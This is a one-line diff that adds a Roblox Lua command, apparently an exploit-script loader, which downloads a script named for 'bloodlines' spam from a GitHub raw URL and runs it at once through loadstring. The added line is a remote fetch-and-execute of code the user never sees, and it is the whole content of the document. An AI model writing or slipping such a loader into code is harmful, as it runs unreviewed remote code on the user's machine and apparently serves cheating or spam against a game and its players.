@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/bloodlines-spam5-tdwzkdi0opfp7d.lua"))()
